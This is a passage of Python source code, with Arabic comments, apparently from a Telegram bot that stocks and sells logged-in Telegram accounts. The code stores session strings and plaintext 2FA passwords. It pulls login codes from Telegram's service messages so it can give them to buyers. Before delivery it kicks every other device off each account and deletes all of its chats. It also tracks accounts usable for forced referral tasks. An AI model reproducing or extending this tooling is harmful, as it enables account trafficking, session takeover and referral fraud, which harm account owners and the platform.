    """يحلّل رد @SpamBot الرسمي ليستخرج: هل هناك تقييد حالياً، وحتى أي وقت/تاريخ ينتهي (إن ذُكر صريحاً)."""
    text = (raw_text or "").strip()
    result = {"restricted": None, "until": None, "raw": text}
    if not text:
        return result
    lower = text.lower()
    if any(k in lower for k in ("good news", "no limits", "free as a bird", "لا يوجد", "no restrictions")):
        result["restricted"] = False
        return result
    result["restricted"] = True
    patterns = [
        r"until\s+([0-9]{1,2}[:.][0-9]{2}(?:\s*(?:UTC|GMT))?[^.\n]{0,40})",
        r"until\s+([A-Za-z0-9,\s\-\/]{4,40}?(?:UTC|GMT|\d{4}))",
        r"limited for\s+([A-Za-z0-9\s]{2,30})",
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            result["until"] = m.group(1).strip().rstrip(". ")
            break
    return result

async def check_spam_status(client: TelegramClient) -> str:
    """يفحص حالة الحظر/التقييد عبر إرسال رسالة تلقائية لبوت @SpamBot الرسمي وقراءة رده.
    للحصول على تفاصيل منفصلة (مقيّد أم لا، ومتى ينتهي)، استخدم check_spam_status_detailed."""
    detail = await check_spam_status_detailed(client)
    return detail["display"]

async def check_spam_status_detailed(client: TelegramClient) -> dict:
    """نسخة تفصيلية من فحص @SpamBot: تُرجع dict فيه restricted (True/False/None) و until (نص وقت الانتهاء إن وُجد)
    والنص الكامل الأصلي، بالإضافة إلى نص عرض جاهز display."""
    try:
        await client.send_message("SpamBot", "/start")
        await asyncio.sleep(3)
        msgs = await client.get_messages("SpamBot", limit=1)
        if not msgs or not msgs[0].message:
            return {"restricted": None, "until": None, "raw": None,
                     "display": "⚠️ لم يصل رد من SpamBot، حاول مجدداً"}
        parsed = parse_spam_reply(msgs[0].message)
        if parsed["restricted"] is False:
            parsed["display"] = "✅ غير مقيّد (حساب سليم)"
        elif parsed["restricted"] is True:
            if parsed["until"]:
                parsed["display"] = f"🚫 مقيّد من الإرسال — ينتهي القيد: {parsed['until']}"
            else:
                parsed["display"] = f"🚫 مقيّد من الإرسال (لم يُذكر وقت انتهاء صريح):\n{msgs[0].message[:300]}"
        else:
            parsed["display"] = f"ℹ️ رد SpamBot غير واضح:\n{msgs[0].message[:300]}"
        return parsed
    except Exception as e:
        logger.error(f"❌ خطأ في فحص SpamBot: {e}")
        return {"restricted": None, "until": None, "raw": None,
                "display": "⚠️ تعذر الفحص حالياً، حاول لاحقاً"}

async def get_device_count(client: TelegramClient) -> int:
    """يُرجع عدد الأجهزة/الجلسات النشطة المسجّلة دخول على هذا الحساب."""
    try:
        result = await client(GetAuthorizationsRequest())
        return len(result.authorizations)
    except Exception as e:
        logger.error(f"❌ خطأ في جلب عدد الأجهزة: {e}")
        return -1

async def get_authorizations_detail(client: TelegramClient) -> list:
    """يُرجع قائمة تفصيلية بكل الأجهزة: الاسم، تاريخ التسجيل، آخر نشاط، هل هو الجهاز الحالي."""
    try:
        result = await client(GetAuthorizationsRequest())
        devices = []
        for auth in result.authorizations:
            devices.append({
                "hash":         auth.hash,
                "current":      auth.current,
                "device":       auth.device_model or "غير معروف",
                "app":          auth.app_name or "غير معروف",
                "platform":     auth.platform or "",
                "country":      auth.country or "",
                "date_created": auth.date_created,
                "date_active":  auth.date_active,
            })
        return devices
    except Exception as e:
        logger.error(f"❌ خطأ في جلب تفاصيل الأجهزة: {e}")
        return []

async def get_session_ip(client: TelegramClient) -> str | None:
    """يُرجع عنوان IP لجلسة البوت الحالية (current=True) من قائمة التفويضات.
    يُستخدم لاكتشاف خطف الجلسة الصامت عبر نفس auth_key من IP مختلف."""
    try:
        result = await client(GetAuthorizationsRequest())
        for auth in result.authorizations:
            if auth.current:
                return auth.ip
    except Exception:
        pass
    return None

async def check_account_frozen(client: TelegramClient, stock_id: int | None = None) -> tuple:
    """
    يفحص إذا كان الحساب مجمّداً/محذوفاً.
    يحفظ تاريخ أول اكتشاف للتجميد في قاعدة البيانات (frozen_at).
    يُرجع (is_frozen: bool, status_text: str, frozen_at_str: str | None).
    """
    is_frozen = False
    status_text = "🟢 نشط"
    frozen_at_str = None
    try:
        me = await client.get_me()
        if me is None or getattr(me, "deleted", False):
            is_frozen = True
            status_text = "🔴 مجمّد/محذوف (الحساب يظهر محذوفاً)"
        else:
            # ── فحص التجميد الفعلي عبر FROZEN_METHOD_INVALID ──────────────
            # الحساب المجمّد: الجلسة سليمة لكن العمليات تُرجع FROZEN_METHOD_INVALID
            try:
                from telethon.tl.functions.account import GetAuthorizationsRequest as _GAR
                await client(_GAR())
            except Exception as _fe:
                if "FROZEN_METHOD_INVALID" in str(_fe) or "FROZEN" in str(_fe).upper():
                    is_frozen = True
                    status_text = "🧊 مجمّد من تيليجرام (يظهر محذوفاً للآخرين)"
    except Exception as e:
        err = str(e).lower()
        if any(k in err for k in ("auth_key_unregistered", "user_deactivated", "session_revoked", "deactivated_ban")):
            is_frozen = True
            status_text = "🔴 محظور/جلسة ألغيت نهائياً"
        elif "frozen" in err or "FROZEN" in str(e):
            is_frozen = True
            status_text = "🧊 مجمّد من تيليجرام"
        else:
            status_text = f"⚠️ تعذّر الفحص: {e}"

    if is_frozen and stock_id is not None:
        try:
            with db_conn() as c:
                row = c.execute(
                    "SELECT frozen_at FROM number_stock WHERE id=%s", (stock_id,)
                ).fetchone()
                if row:
                    if row["frozen_at"] is None:
                        c.execute(
                            "UPDATE number_stock SET frozen_at=NOW() WHERE id=%s", (stock_id,)
                        )
                        frozen_at_str = "الآن (تم اكتشافه للتو)"
                    else:
                        fa = row["frozen_at"]
                        if hasattr(fa, "strftime"):
                            frozen_at_str = fa.strftime("%Y-%m-%d %H:%M UTC")
                        else:
                            frozen_at_str = str(fa)
        except Exception as db_err:
            logger.error(f"❌ خطأ في حفظ frozen_at: {db_err}")

    return is_frozen, status_text, frozen_at_str

async def _fetch_code_for_delivery(session_str: str) -> str | None:
    """يحاول جلب آخر كود تحقق من رسائل 777000 عبر الجلسة — للإرسال الفوري عند التسليم."""
    if not (session_str and TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return None
    cli = None
    try:
        cli = TelegramClient(StringSession(session_str), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        await asyncio.wait_for(cli.connect(), timeout=15)
        if not await asyncio.wait_for(cli.is_user_authorized(), timeout=8):
            return None
        import datetime as _dt_cfd
        _cfd_after = _dt_cfd.datetime.now(_dt_cfd.timezone.utc) - _dt_cfd.timedelta(minutes=15)
        raw, _raw_date = await fetch_last_login_code(cli, after_date=_cfd_after)
        if raw:
            m = re.search(r'(\d{4,7})', raw)
            if m:
                return m.group(1)
    except Exception:
        pass
    finally:
        try:
            if cli: await cli.disconnect()
        except Exception:
            pass
    return None

async def fetch_last_login_code(client: TelegramClient, after_date=None):
    """يجلب آخر رسالة كود تفعيل وصلت من حساب تيليجرام الرسمي (777000) لهذا الرقم.
    إذا أُعطي after_date، يُرجع فقط الأكواد التي وصلت بعد هذا التاريخ.
    يُرجع tuple (نص_الرسالة, تاريخ_الرسالة) أو (None, None) إن لم يوجد."""
    import datetime as _dt
    try:
        msgs = await client.get_messages(777000, limit=10)
        for m in msgs:
            if not m.message or not any(ch.isdigit() for ch in m.message):
                continue
            if after_date is not None:
                msg_date = m.date
                if msg_date.tzinfo is None:
                    msg_date = msg_date.replace(tzinfo=_dt.timezone.utc)
                after = after_date
                if after.tzinfo is None:
                    after = after.replace(tzinfo=_dt.timezone.utc)
                threshold = after - _dt.timedelta(minutes=10)
                if msg_date < threshold:
                    continue  # كود قديم جداً — تخطَّه
            return m.message, m.date
        return None, None
    except Exception as e:
        logger.error(f"❌ خطأ في جلب كود الدخول: {e}")
        return None, None

def list_stock_numbers(filter_type: str = "all"):
    """أرقام المخزون غير المباعة، مع تصنيف اختياري:
    - "all": كل الأرقام غير المباعة (المعروضة + المنتظرة)، بدون المحذوفة ولا المبيوعة.
    - "listed": المعروضة للبيع فعلاً (تُسلَّم فوراً عند الشراء).
    - "pending": بانتظار طرد الجلسات الأخرى قبل أن تصبح قابلة للبيع.
    - "kicked": الأرقام المطرودة (فُصلت جلستها من تيليجرام) وما زالت غير محذوفة.
    - "trash": الأرقام المحذوفة (سلة المهملات)، بغض النظر عن حالة البيع.
    الأرقام المبيوعة (ever_sold=TRUE) تُستثنى من جميع القوائم — تظهر فقط في صفحة الحسابات المبيوعة.
    """
    if filter_type == "trash":
        sql = "SELECT id, phone_number, session_string, sessions_reset, force_listed, deleted_at, added_at FROM number_stock WHERE deleted_at IS NOT NULL"
    elif filter_type == "kicked":
        sql = (
            "SELECT id, phone_number, session_string, sessions_reset, force_listed, kicked_at, added_at "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND last_authorized=FALSE AND ever_sold IS NOT TRUE"
        )
    elif filter_type == "frozen":
        sql = (
            "SELECT id, phone_number, session_string, frozen_at, added_at "
            "FROM number_stock WHERE frozen_at IS NOT NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE"
        )
    elif filter_type == "auto_2fa":
        sql = (
            "SELECT id, phone_number, session_string, twofa_password, added_at "
            "FROM number_stock WHERE auto_2fa_enabled=TRUE AND deleted_at IS NULL AND ever_sold IS NOT TRUE"
        )
    elif filter_type == "complete":
        # أرقام مكتملة: البوت الجلسة الوحيدة + يستطيع إرسال كود
        sql = (
            "SELECT id, phone_number, session_string, twofa_password, is_solo, can_send_code, last_device_count, added_at "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
            "AND is_solo IS TRUE AND can_send_code IS TRUE AND last_authorized IS NOT FALSE"
        )
    elif filter_type == "unknown_verify":
        # تحقق غير معروف: جلسة موجودة + مصرَّح + لكن البوت ليس الوحيد (جلسات أخرى موجودة)
        sql = (
            "SELECT id, phone_number, session_string, twofa_password, is_solo, can_send_code, last_device_count, added_at "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
            "AND last_authorized IS NOT FALSE AND session_string IS NOT NULL "
            "AND (is_solo IS FALSE OR is_solo IS NULL) AND (can_send_code IS FALSE OR can_send_code IS NULL)"
        )
    elif filter_type == "multi_device":
        # أجهزة متعددة: أكثر من جهاز واحد مسجّل
        sql = (
            "SELECT id, phone_number, session_string, twofa_password, last_device_count, is_solo, can_send_code, added_at "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
            "AND last_authorized IS NOT FALSE AND last_device_count > 1"
        )
    elif filter_type == "accessible_full":
        # ✅ حسابات يمكن للبوت الدخول إليها والتحكم بها وقراءة رسائلها (can_send_code حقيقي)
        sql = (
            "SELECT id, phone_number, session_string, twofa_password, is_solo, can_send_code, last_device_count, added_at "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
            "AND last_authorized IS NOT FALSE AND session_string IS NOT NULL AND can_send_code IS TRUE"
        )
    elif filter_type == "multi_device_access":
        # 📲 حسابات بأجهزة متعددة + يمكن للبوت الدخول إليها (can_send_code أو مصرَّح)
        sql = (
            "SELECT id, phone_number, session_string, twofa_password, last_device_count, is_solo, can_send_code, added_at "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
            "AND last_authorized IS NOT FALSE AND session_string IS NOT NULL AND last_device_count > 1"
        )
    elif filter_type == "no_2fa_accessible":
        # أرقام يمكن للبوت الوصول إليها ولا 2FA مضبوط (يمكن إرسال كود لها)
        sql = (
            "SELECT id, phone_number, session_string, is_solo, can_send_code, last_device_count, twofa_reset_date, added_at "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
            "AND last_authorized IS NOT FALSE AND session_string IS NOT NULL "
            "AND (twofa_password IS NULL OR twofa_password = '')"
        )
    elif filter_type == "with_2fa_accessible":
        # أرقام يمكن للبوت الوصول إليها ولها 2FA محفوظة
        sql = (
            "SELECT id, phone_number, session_string, twofa_password, is_solo, can_send_code, last_device_count, added_at "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
            "AND last_authorized IS NOT FALSE AND session_string IS NOT NULL "
            "AND twofa_password IS NOT NULL AND twofa_password != ''"
        )
    else:
        sql = "SELECT id, phone_number, session_string, sessions_reset, force_listed, twofa_password, last_authorized, frozen_at, added_at FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE"
        if filter_type == "listed":
            sql += f" AND {_sellable_filter_sql()}"
        elif filter_type == "pending":
            sql += f" AND NOT ({_sellable_filter_sql()})"
    sql += " ORDER BY kicked_at DESC NULLS LAST, id ASC" if filter_type == "kicked" else " ORDER BY id ASC"
    with db_conn() as c:
        rows = c.execute(sql).fetchall()
        return [dict(r) for r in rows]

def get_number_counts() -> dict:
    """يحسب عدد كل تصنيف من أرقام المخزون (غير المباعة وغير المحذوفة وغير المبيوعة)، دفعة واحدة."""
    with db_conn() as c:
        row = c.execute(
            "SELECT "
            "COUNT(*) AS total, "
            f"COUNT(*) FILTER (WHERE {_sellable_filter_sql()}) AS listed, "
            "COUNT(*) FILTER (WHERE last_authorized=FALSE) AS kicked, "
            "COUNT(*) FILTER (WHERE frozen_at IS NOT NULL) AS frozen, "
            "COUNT(*) FILTER (WHERE auto_2fa_enabled=TRUE) AS auto_2fa, "
            "COUNT(*) FILTER (WHERE is_solo IS TRUE AND can_send_code IS TRUE AND last_authorized IS NOT FALSE) AS complete, "
            "COUNT(*) FILTER (WHERE last_authorized IS NOT FALSE AND session_string IS NOT NULL "
            "  AND (is_solo IS FALSE OR is_solo IS NULL) AND (can_send_code IS FALSE OR can_send_code IS NULL)) AS unknown_verify, "
            "COUNT(*) FILTER (WHERE last_authorized IS NOT FALSE AND last_device_count > 1) AS multi_device "
            "FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE"
        ).fetchone()
        total = row["total"] if row else 0
        listed = row["listed"] if row else 0
        kicked = row["kicked"] if row else 0
        frozen = row["frozen"] if row else 0
        with db_conn() as c2:
            trow = c2.execute("SELECT COUNT(*) AS cnt FROM number_stock WHERE deleted_at IS NOT NULL").fetchone()
            trash = trow["cnt"] if trow else 0
            srow = c2.execute("SELECT COUNT(*) AS cnt FROM number_stock WHERE ever_sold IS TRUE AND deleted_at IS NULL").fetchone()
            sold = srow["cnt"] if srow else 0
        auto_2fa       = row["auto_2fa"]       if row else 0
        complete       = row["complete"]       if row else 0
        unknown_verify = row["unknown_verify"] if row else 0
        multi_device   = row["multi_device"]   if row else 0
        with db_conn() as c3:
            na_row = c3.execute(
                "SELECT COUNT(*) AS cnt FROM number_stock "
                "WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
                "AND last_authorized IS NOT FALSE AND session_string IS NOT NULL "
                "AND (twofa_password IS NULL OR twofa_password = '')"
            ).fetchone()
            wa_row = c3.execute(
                "SELECT COUNT(*) AS cnt FROM number_stock "
                "WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
                "AND last_authorized IS NOT FALSE AND session_string IS NOT NULL "
                "AND twofa_password IS NOT NULL AND twofa_password != ''"
            ).fetchone()
        no_2fa_accessible   = na_row["cnt"] if na_row else 0
        with_2fa_accessible = wa_row["cnt"] if wa_row else 0
        with db_conn() as c4:
            af_row = c4.execute(
                "SELECT COUNT(*) AS cnt FROM number_stock "
                "WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
                "AND last_authorized IS NOT FALSE AND session_string IS NOT NULL AND can_send_code IS TRUE"
            ).fetchone()
            mda_row = c4.execute(
                "SELECT COUNT(*) AS cnt FROM number_stock "
                "WHERE assigned_to IS NULL AND deleted_at IS NULL AND ever_sold IS NOT TRUE "
                "AND last_authorized IS NOT FALSE AND session_string IS NOT NULL AND last_device_count > 1"
            ).fetchone()
        accessible_full  = af_row["cnt"]  if af_row  else 0
        multi_device_access = mda_row["cnt"] if mda_row else 0
        return {
            "all": total, "listed": listed, "pending": total - listed,
            "kicked": kicked, "trash": trash, "frozen": frozen,
            "auto_2fa": auto_2fa, "sold": sold,
            "complete": complete, "unknown_verify": unknown_verify, "multi_device": multi_device,
            "no_2fa_accessible": no_2fa_accessible, "with_2fa_accessible": with_2fa_accessible,
            "accessible_full": accessible_full, "multi_device_access": multi_device_access,
        }

def get_stock_number(stock_id: int):
    with db_conn() as c:
        row = c.execute(
            "SELECT id, phone_number, session_string, assigned_to, sessions_reset, force_listed, frozen_at, "
            "twofa_password, deleted_at, last_authorized "
            "FROM number_stock WHERE id=%s",
            (stock_id,)
        ).fetchone()
        return dict(row) if row else None

def soft_delete_number(stock_id: int) -> bool:
    """ينقل رقماً إلى سلة المهملات (حذف مؤقت) بدل حذفه نهائياً."""
    with db_conn() as c:
        c.execute("UPDATE number_stock SET deleted_at=NOW() WHERE id=%s", (stock_id,))
        return True

def restore_deleted_number(stock_id: int) -> bool:
    """يستعيد رقماً من سلة المهملات."""
    with db_conn() as c:
        c.execute("UPDATE number_stock SET deleted_at=NULL WHERE id=%s", (stock_id,))
        return True

def permanently_delete_number(stock_id: int) -> bool:
    """يحذف رقماً نهائياً من قاعدة البيانات (لا يمكن التراجع بعده)."""
    with db_conn() as c:
        c.execute("DELETE FROM number_stock WHERE id=%s", (stock_id,))
        return True

def set_force_listed(stock_id: int) -> bool:
    with db_conn() as c:
        c.execute("UPDATE number_stock SET force_listed=TRUE WHERE id=%s", (stock_id,))
        return True

def _sellable_filter_sql() -> str:
    """رقم يُعتبر قابلاً للبيع فقط إذا اكتملت جميع شروط الجاهزية الثلاثة:
    ① البوت هو الجلسة الوحيدة   (is_solo IS TRUE)
    ② البوت يعرف كلمة 2FA        (twofa_password IS NOT NULL)
    ③ البوت يستطيع إرسال كود     (can_send_code IS TRUE)
    بالإضافة إلى:
    - جلسة نشطة صالحة (last_authorized IS NOT FALSE)
    - غير مجمّد
    - لم يُباع سابقاً أبداً (ever_sold IS NOT TRUE) — حظر نهائي لا استثناء فيه
    الحسابات المبيوعة سابقاً تظهر فقط في صفحة الحسابات المبيوعة ولا تُعرض للبيع مجدداً."""
    return (
        "session_string IS NOT NULL"
        " AND last_authorized IS NOT FALSE"
        " AND twofa_password IS NOT NULL"
        " AND twofa_password <> ''"
        " AND frozen_at IS NULL"
        " AND ever_sold IS NOT TRUE AND can_send_code IS TRUE AND last_authorized IS NOT FALSE"
        " AND is_solo IS TRUE"
        " AND can_send_code IS TRUE"
        " AND referral_only IS NOT TRUE"
    )

def get_available_number_count() -> int:
    with db_conn() as c:
        row = c.execute(
            f"SELECT COUNT(*) as cnt FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND {_sellable_filter_sql()}"
        ).fetchone()
        return row["cnt"] if row else 0

def get_forced_ref_account_count() -> int:
    """عدد الحسابات المؤهلة للإحالة الإجبارية: فقط الحسابات التي يمكن للبوت فعلاً فتحها والعمل بها
    (can_send_code=TRUE وغير مجمّدة)."""
    with db_conn() as c:
        row = c.execute(
            f"SELECT COUNT(*) as cnt FROM number_stock"
            f" WHERE session_string IS NOT NULL AND deleted_at IS NULL AND assigned_to IS NULL"
            f" AND ever_sold IS NOT TRUE AND can_send_code IS TRUE AND last_authorized IS NOT FALSE"
            f" AND frozen_at IS NULL AND forced_ref_excluded IS NOT TRUE"
        ).fetchone()
        return row["cnt"] if row else 0

async def _test_and_set_can_send_code(phone: str, session_str: str, stock_id: int):
    """يتحقق من قدرة البوت على الوصول للحساب وجلب الكودات:
    يتصل بالجلسة المحفوظة، يستدعي get_me()، وإذا أرجعت بيانات مستخدم صحيحة
    يضبط can_send_code=TRUE — يعني البوت يستطيع إرسال كود للمشتري عند الطلب."""
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return
    try:
        _cli = TelegramClient(StringSession(session_str), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        await asyncio.wait_for(_cli.connect(), timeout=15)
        try:
            if await asyncio.wait_for(_cli.is_user_authorized(), timeout=8):
                me = await asyncio.wait_for(_cli.get_me(), timeout=10)
                if me and me.phone:
                    with db_conn() as _c:
                        _c.execute(
                            "UPDATE number_stock SET can_send_code=TRUE WHERE id=%s AND ever_sold IS NOT TRUE",
                            (stock_id,)
                        )
                    logger.info(f"✅ can_send_code=TRUE للرقم {phone} (الحساب جاهز للبيع إذا اكتملت باقي الشروط)")
                else:
                    logger.warning(f"⚠️ can_send_code: get_me() لم يُرجع رقم هاتف للحساب {phone}")
            else:
                logger.warning(f"⚠️ can_send_code: جلسة {phone} غير مصرَّح بها")
        finally:
            try:
                await _cli.disconnect()
            except Exception:
                pass
    except Exception as _e:
        logger.debug(f"⚠️ _test_and_set_can_send_code {phone}: {_e}")

async def _ensure_can_send_code(phone: str, session_str: str, stock_id: int):
    """يُستدعى عندما يصبح البوت الجلسة الوحيدة — يتحقق ويضبط can_send_code إذا لم يكن مضبوطاً بعد.
    يتجاهل الحسابات المبيوعة سابقاً أو التي جُرِّب كودها مسبقاً."""
    try:
        with db_conn() as _ec:
            _row = _ec.execute(
                "SELECT ever_sold, can_send_code FROM number_stock WHERE id=%s", (stock_id,)
            ).fetchone()
        if not _row or _row["ever_sold"] or _row["can_send_code"]:
            return  # مباع سابقاً أو مضبوط مسبقاً — لا حاجة للفحص
        await _test_and_set_can_send_code(phone, session_str, stock_id)
    except Exception as _e:
        logger.debug(f"⚠️ _ensure_can_send_code {phone}: {_e}")

def add_number_with_session(phone: str, session_str: str) -> bool:
    """يضيف رقماً جاهزاً (مسجّل دخول مسبقاً) مع جلسته إلى المخزون. يُرجع False إن كان الرقم موجوداً مسبقاً."""
    with db_conn() as c:
        c.execute(
            "INSERT INTO number_stock (phone_number, session_string, deleted_at) VALUES (%s,%s,NULL) "
            "ON CONFLICT (phone_number) DO UPDATE SET session_string=EXCLUDED.session_string, deleted_at=NULL",
            (phone, session_str)
        )
        return True

def assign_next_number(user_id: int):
    """يسحب رقماً متاحاً من المخزون ويحجزه لهذا المستخدم بشكل ذرّي (يمنع تكرار تسليم نفس الرقم
    لشخصين عند الطلب المتزامن). يُرجع dict {phone_number, session_string} إن وُجد، أو None إن كان المخزون فارغاً."""
    with db_conn() as c:
        already_sold = c.execute(
            "SELECT prize_value FROM prize_exchanges "
            "WHERE user_id=%s AND status IN ('completed','duplicate_compensated') "
            "AND prize_type IN ('telegram_number','telegram_number_code') "
            "AND prize_value NOT IN ('number','manual')",
            (user_id,)
        ).fetchall()
        exclude_phones = [r["prize_value"] for r in already_sold] if already_sold else []
        excl_sql = ""
        excl_params = []
        if exclude_phones:
            placeholders = ",".join(["%s"] * len(exclude_phones))
            excl_sql = f" AND phone_number NOT IN ({placeholders})"
            excl_params = exclude_phones

        row = c.execute(
            "UPDATE number_stock SET assigned_to=%s, assigned_at=NOW(), ever_sold=TRUE "
            "WHERE id = (SELECT id FROM number_stock WHERE assigned_to IS NULL AND deleted_at IS NULL AND "
            f"{_sellable_filter_sql()}{excl_sql} ORDER BY id ASC LIMIT 1 FOR UPDATE SKIP LOCKED) "
            "RETURNING phone_number, session_string",
            [user_id] + excl_params
        ).fetchone()
        if not row:
            return None
        return {"phone_number": row["phone_number"], "session_string": row["session_string"]}

def _auto_delete_number(stock_id: int, phone: str, reason: str):
    """يحذف رقماً من المخزون نهائياً مع تسجيل السبب في اللوج."""
    try:
        with db_conn() as c:
            c.execute(
                "UPDATE number_stock SET deleted_at=NOW(), assigned_to=NULL, assigned_at=NULL "
                "WHERE id=%s",
                (stock_id,)
            )
        logger.warning(f"🗑 حُذف الرقم {phone} تلقائياً — السبب: {reason}")
    except Exception as _del_err:
        logger.error(f"❌ فشل حذف الرقم {phone}: {_del_err}")

async def assign_verified_number(user_id: int, bot=None) -> dict | None:
    """
    يختار رقماً من المخزون ويُجري ثلاثة فحوصات إلزامية قبل التسليم:
      ① ever_sold IS NOT TRUE       — لم يُباع سابقاً (في SQL)
      ② is_user_authorized() = True — البوت لا يزال يستطيع استقبال الأكواد
      ③ twofa_password مضبوط       — البوت يعرف رمز التحقق الثنائي

    أي فشل → يحذف الرقم نهائياً من المخزون ويجرب التالي.
    أرقام بلا session (يدوية) → تُحذف فوراً ولا تُعرض للبيع.
    يُرجع dict {phone_number, session_string, twofa_password} أو None إن فرغ المخزون.
    """
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        logger.error("❌ TELEGRAM_API_ID/HASH غير مضبوط — تعذّر التحقق من الأرقام قبل البيع.")
        return None

    MAX_TRIES = 10
    skipped_ids: list[int] = []

    with db_conn() as _dup_c:
        _already = _dup_c.execute(
            "SELECT prize_value FROM prize_exchanges "
            "WHERE user_id=%s AND status IN ('completed','duplicate_compensated') "
            "AND prize_type IN ('telegram_number','telegram_number_code') "
            "AND prize_value NOT IN ('number','manual')",
            (user_id,)
        ).fetchall()
    _exclude_phones = [r["prize_value"] for r in (_already or [])]

    for _attempt in range(MAX_TRIES):
        with db_conn() as c:
            excl_parts: list[str] = []
            excl_vals:  list      = []
            if skipped_ids:
                excl_parts.append(f"AND id NOT IN ({','.join(str(i) for i in skipped_ids)})")
            if _exclude_phones:
                ph_phs = ",".join(["%s"] * len(_exclude_phones))
                excl_parts.append(f"AND phone_number NOT IN ({ph_phs})")
                excl_vals.extend(_exclude_phones)
            excl = " ".join(excl_parts)
            row = c.execute(
                f"UPDATE number_stock SET assigned_to=%s, assigned_at=NOW(), ever_sold=TRUE "
                f"WHERE id = (SELECT id FROM number_stock "
                f"WHERE assigned_to IS NULL AND deleted_at IS NULL AND {_sellable_filter_sql()} "
                f"{excl} ORDER BY RANDOM() LIMIT 1 FOR UPDATE SKIP LOCKED) "
                f"RETURNING id, phone_number, session_string, twofa_password",
                [user_id] + excl_vals
            ).fetchone()

        if not row:
            break  # المخزون فارغ تماماً

        stock_id = row["id"]
        phone    = row["phone_number"]
        sess     = row["session_string"]
        saved_pw = row["twofa_password"] or ""

        # ─── فحص ①: هل للرقم جلسة أصلاً؟ (رقم يدوي = يُحذف) ───
        if not sess:
            _auto_delete_number(stock_id, phone, "رقم يدوي بلا جلسة — لا يُباع")
            continue

        # ─── فحص ③: هل كلمة مرور 2FA مخزّنة؟ ───
        if not saved_pw.strip():
            _auto_delete_number(stock_id, phone, "لا يوجد رمز 2FA — لا يمكن تسليمه للمشتري")
            continue

        # ─── فحص ②: هل البوت لا يزال مصرّحاً (يستطيع استقبال الأكواد)؟ ───
        cli_check = None
        try:
            cli_check = TelegramClient(StringSession(sess), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
            await asyncio.wait_for(cli_check.connect(), timeout=15)
            authorized = await asyncio.wait_for(cli_check.is_user_authorized(), timeout=10)

            if not authorized:
                _auto_delete_number(stock_id, phone, "جلسة منتهية — البوت لا يستطيع استقبال الأكواد")
                await cli_check.disconnect()
                continue

            # ─── فحص إضافي: هل الحساب مجمّد؟ ───
            is_frz, _, _ = await check_account_frozen(cli_check, stock_id)
            if is_frz:
                _auto_delete_number(stock_id, phone, "حساب مجمّد من تيليغرام")
                await cli_check.disconnect()
                continue

            # ─── تنظيف: طرد أي أجهزة إضافية قبل التسليم ───
            devices = await get_device_count(cli_check)
            if devices > 1:
                try:
                    await cli_check(ResetAuthorizationsRequest())
                    with db_conn() as c:
                        c.execute("UPDATE number_stock SET sessions_reset=TRUE WHERE id=%s", (stock_id,))
                    logger.info(f"✅ طُردت {devices - 1} جلسة إضافية للرقم {phone} قبل التسليم.")
                except Exception as kick_err:
                    logger.warning(f"⚠️ تعذّر طرد جلسات {phone}: {kick_err}")

            # ─── مسح جميع المحادثات قبل تسليم الرقم للمشتري ───
            try:
                async for _dlg in cli_check.iter_dialogs(limit=300):
                    try:
                        await cli_check.delete_dialog(_dlg, revoke=True)
                    except Exception:
                        pass
                logger.info(f"🧹 تم مسح محادثات الرقم {phone} قبل التسليم.")
            except Exception as _clr_err:
                logger.warning(f"⚠️ تعذّر مسح بعض محادثات {phone}: {_clr_err}")

            await cli_check.disconnect()

        except Exception as chk_err:
            logger.warning(f"⚠️ فشل الاتصال بجلسة {phone}: {chk_err} — يُحذف")
            _auto_delete_number(stock_id, phone, f"خطأ في الاتصال: {type(chk_err).__name__}")
            try:
                if cli_check:
                    await cli_check.disconnect()
            except Exception:
                pass
            continue

        # ─── الرقم اجتاز الفحوصات الثلاثة ✅ ───
        logger.info(f"✅ الرقم {phone} اجتاز جميع الفحوصات — جاهز للتسليم.")
        return {"phone_number": phone, "session_string": sess, "twofa_password": saved_pw}

    logger.info(f"📭 assign_verified_number: لا يوجد رقم صالح بعد {MAX_TRIES} محاولة.")
    return None

# ═══════════════════════════════════════════════════════════
# ═══════════════════════════════════════════════════════════

def get_referral_tasks(only_active: bool = False) -> list:
    with db_conn() as c:
        sql = "SELECT * FROM referral_tasks"
        if only_active:
            sql += " WHERE active=TRUE"
        sql += " ORDER BY id ASC"
        return [dict(r) for r in c.execute(sql).fetchall()]

def get_referral_task(task_id: int) -> dict | None:
    with db_conn() as c:
        row = c.execute("SELECT * FROM referral_tasks WHERE id=%s", (task_id,)).fetchone()
        return dict(row) if row else None

def add_referral_task(label: str, bot_username: str, start_param: str,
                       mandatory_channels: str = "", folder_link: str = "") -> int:
    with db_conn() as c:
        row = c.execute(
            "INSERT INTO referral_tasks "
            "(label, bot_username, start_param, mandatory_channels, folder_link) "
            "VALUES (%s,%s,%s,%s,%s) RETURNING id",
            (label, bot_username, start_param, mandatory_channels or "", folder_link or "")
        ).fetchone()
        return row["id"]

def delete_referral_task(task_id: int):
    with db_conn() as c:
        c.execute("DELETE FROM referral_completions WHERE task_id=%s", (task_id,))
